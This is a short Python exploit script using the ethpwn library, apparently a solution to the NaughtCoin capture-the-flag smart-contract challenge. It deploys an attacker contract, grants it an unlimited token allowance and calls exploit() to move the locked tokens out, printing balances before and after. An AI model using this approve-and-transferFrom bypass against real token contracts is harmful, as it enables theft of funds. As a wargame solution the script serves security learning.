#!/usr/bin/env python3

from ethpwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('exploit_contract_source', type=str)
parser.add_argument('proxy_addr', type=str)
ARGS = parser.parse_args()

MY_WALLET = get_wallet(None)

context.log_level = 'DEBUG'

CONTRACT_METADATA.compile_solidity_files([ARGS.exploit_contract_source])

naught_coin = CONTRACT_METADATA['NaughtCoin'].get_contract_at(ARGS.proxy_addr)

with CONTRACT_METADATA['Exploit'].deploy_destructible(ARGS.proxy_addr) as (tx_hash, target):
    print(f"Exploit contract is at {target.address}")

    supply = naught_coin.functions.balanceOf(target.address).call()
    print(f"Exploit contract has {supply=} tokens")

    supply_wallet = naught_coin.functions.balanceOf(MY_WALLET.address).call()
    print(f"My wallet has {supply_wallet=} tokens")

    # approve an infinite amount of tokens to the exploit contract
    transact(naught_coin.functions.approve(target.address, 2**256-1))

    print("Current allowance: ", naught_coin.functions.allowance(MY_WALLET.address, target.address).call())

    transact(target.functions.exploit())

    supply = naught_coin.functions.balanceOf(target.address).call()
    print(f"Exploit contract has {supply=} tokens")

    supply_wallet = naught_coin.functions.balanceOf(MY_WALLET.address).call()
    print(f"My wallet has {supply_wallet=} tokens")
